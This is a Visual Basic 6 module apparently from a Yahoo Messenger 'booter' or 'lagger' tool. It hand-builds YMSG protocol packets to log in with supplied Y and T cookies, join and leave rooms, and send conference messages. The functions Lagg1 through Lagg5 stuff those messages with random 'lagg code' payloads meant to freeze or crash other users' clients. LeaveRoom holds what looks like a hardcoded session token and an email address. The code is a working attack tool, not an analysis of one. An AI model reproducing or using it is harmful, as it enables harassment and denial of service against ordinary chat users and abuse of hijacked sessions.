Attribute VB_Name = "Module1"
Option Explicit
Const Name As String = "YMSG"
Const Ver As Integer = 13
Public Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Private Function Header(ByVal StrPacketType As String, ByVal StrStat As String, ByVal StrSession As String, ByVal StrComm As Long) As String
On Error Resume Next
Dim Version As String
Version = 102
Header = "YMSG" & Chr(0) & Chr(&HF) & String(2, Chr(0)) & Chr(Int(Len(StrPacketType) / 256)) & Chr(Int(Len(StrPacketType) Mod 256)) & Chr(Int(StrComm / 256)) & Chr(Int(StrComm Mod 256)) & Mid(StrStat, 1, 4) & Mid(StrSession, 1, 4) & StrPacketType
End Function
Public Function Login(YahooID As String, YCookie As String, TCookie As String)
On Error Resume Next
Login = Header("0À€" & YahooID & "À€2À€" & YahooID & "À€1À€" & YahooID & "À€244À€1À€6À€" & YCookie & " " & TCookie & "À€98À€usÀ€", String(4, Chr(0)), String(4, Chr(0)), 550)
End Function
Public Sub Pause(Interval)
On Error Resume Next
Dim Delay
Delay = Timer
Do While Timer - Delay < Val(Interval)
DoEvents
Loop
End Sub
Public Function GoToRoom(Whofrom As String)
  Dim Packet As String
    Packet = "109À€" & Whofrom & "À€1À€" & Whofrom & "À€6À€abcdeÀ€98À€usÀ€135À€ym9.0.0.907À€"
    GoToRoom = Header(Packet, String(4, 0), String(4, 0), 150)
End Function
Public Function JoinRoom(Whofrom As String, RoomName As String, ByVal RoomKey As String)
  Dim Packet As String
    Packet = "1À€" & Whofrom & "À€104À€" & RoomName & "À€129À€" & RoomKey & "À€62À€2À€"
    JoinRoom = Header(Packet, String(4, 0), Whofrom, 152)
End Function
Public Function PreLogin() As String
    PreLogin = Header("", String(4, 0), String(4, 0), 76)
End Function


Sub GotoSite(URL As String)
On Error GoTo someerror
    If Left(LCase(URL), 4) = "www." Then URL = "http://" + URL
        Shell ("explorer.exe " + URL), vbNormalFocus
    Exit Sub
someerror:
    Beep
    Exit Sub
End Sub


Public Function LeaveRoom(YahooID As String) As String
  Dim Packet As String
    Packet = "1À€" & YahooID & "À€1005À€357453521..lvlalvlacl-.-.-.-.-.-.-.-xterr0r@rogers.com..13..256..50..l2o5v4..52..lvlalvlacl-.-.-.-.-.-.-.-xterr0r@rogers.com..57..l2o5v4-KtqCObwvSn416ed83uI0Nw--..58..Join My Voice Conference.....97..1..233..t_KWLBpTpl74itc6Vh3o0NY36qgW5o5Is-..234..l2o5v4-KtqCObwvSn416ed83uI0Nw--.."
    LeaveRoom = Header(Packet, String(4, 0), YahooID, 15)
End Function

Public Function CF(MyID As String, WhoCF As String, Messege As String)
    CF = Header("1À€" & MyID & "À€50À€" & MyID & "À€57À€" & MyID & "-1263205661À€58À€" & Messege & "À€97À€1À€52À€" & WhoCF & "À€13À€256À€", String(4, Chr(0)), String(4, Chr(0)), 24)
End Function
Public Function CFText(MyID As String, Confkey As String, WhoCF As String, Messege As String)
    CFText = Header("1À€" & MyID & "À€57À€" & Confkey & "À€53À€" & WhoCF & "À€14À€" & Messege & "À€97À€1À€", String(4, Chr(0)), String(4, Chr(0)), 29)
End Function

Public Function CFJoin(MyID As String, CFkey As String, WhoInv As String)
    CFJoin = Header("1À€" & MyID & "À€57À€" & CFkey & "À€3À€" & WhoInv & "À€", String(4, Chr(0)), String(4, Chr(0)), 25)
End Function
Public Function CFLeft(MyID As String, CFkey As String, WhoInv As String)
    CFLeft = Header("1À€" & MyID & "À€57À€" & CFkey & "À€3À€" & WhoInv & "À€1005À€28888624À€", String(4, Chr(0)), String(4, Chr(0)), 27)
End Function
Public Function Lagg1(Whofrom As String) As String
On Error Resume Next
Lagg1 = Header("1À€" & Whofrom & "À€57À€" & iForm.Text2.Text & "À€53À€" & iForm.Text1.Text & "À€14À€" & RandomAlt & RandomFont & Randomlaggcode & "À€97À€1À€", String(4, Chr(0)), String(4, Chr(0)), 29)
End Function

Public Function Lagg2(Whofrom As String) As String
On Error Resume Next
Lagg2 = Header("1À€" & Whofrom & "À€57À€" & iForm.Text2.Text & "À€53À€" & iForm.Text1.Text & "À€14À€" & RandomAlt & RandomFont & Randomlaggcode & "À€97À€1À€", String(4, Chr(0)), String(4, Chr(0)), 29)
End Function
Public Function Lagg3(Whofrom As String) As String
On Error Resume Next
Lagg3 = Header("1À€" & Whofrom & "À€57À€" & iForm.Text2.Text & "À€53À€" & iForm.Text1.Text & "À€14À€" & RandomSS & RandomSS & RandomSS & "À€97À€1À€", String(4, Chr(0)), String(4, Chr(0)), 29)
End Function

Public Function Lagg4(Whofrom As String) As String
On Error Resume Next
Lagg4 = Header("1À€" & Whofrom & "À€57À€" & iForm.Text2.Text & "À€53À€" & iForm.Text1.Text & "À€14À€" & RandomSS & RandomS55 & RandomS33 & "À€97À€1À€", String(4, Chr(0)), String(4, Chr(0)), 29)
End Function
Public Function Lagg5(Whofrom As String) As String
On Error Resume Next
Lagg5 = Header("1À€" & Whofrom & "À€57À€" & iForm.Text2.Text & "À€53À€" & iForm.Text1.Text & "À€14À€" & RandomSS & RandomS55 & RandomS33 & RandomS11 & RandomS22 & "À€97À€1À€", String(4, Chr(0)), String(4, Chr(0)), 29)
End Function
